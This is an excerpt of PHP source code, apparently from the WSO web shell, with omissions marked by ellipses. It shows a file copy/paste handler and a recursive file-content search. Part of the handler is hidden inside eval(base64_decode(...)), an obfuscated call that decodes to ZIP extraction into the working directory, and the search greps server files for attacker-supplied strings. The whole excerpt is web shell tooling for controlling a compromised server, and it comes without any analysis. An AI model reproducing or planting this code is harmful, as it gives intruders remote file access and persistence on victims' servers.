			...
			case 'paste':
				if($_SESSION['act'] == 'copy') {
					...
					if(class_exists('ZipArchive'))
						eval(base64_decode(''));
/*$zip = new ZipArchive;
if ($zip->open('wso_'.date("Ymd_His").'.zip', ZipArchive::CREATE)) {
	chdir($_SESSION['c']);
	foreach($_SESSION['f'] as $f) {
	...
	$zip->close();
					...
					if(class_exists('ZipArchive'))
						eval(base64_decode('JHppcCA9IG5ldyBaaXBBcmNoaXZlOw0KZm9yZWFjaCgkX1NFU1NJT05bJ2YnXSBhcyAkZikgew0KCWlmKCR6aXAtPm9wZW4oJF9TRVNTSU9OWydjJ10uJGYpKSB7DQoJCSR6aXAtPmV4dHJhY3RUbygkR0xPQkFMU1snY3dkJ10pOw0KCQkkemlwLT5jbG9zZSgpOw0KCX0NCn0='));
/*$zip = new ZipArchive;
foreach($_SESSION['f'] as $f) {
			...
			foreach($paths as $item) {
				if(@is_dir($item)){
					...
					if(@strpos(@file_get_contents($item), @$_POST['p2'])!==false)
						echo "<a href='#' onclick='g(\"FilesTools\",null,\"$item\", \"view\")'>$item</a><br>";
				}
			}
		}
	}
	if(@$_POST['p3'])
		recursiveGlob($_POST['c']);
	?>
	</div>
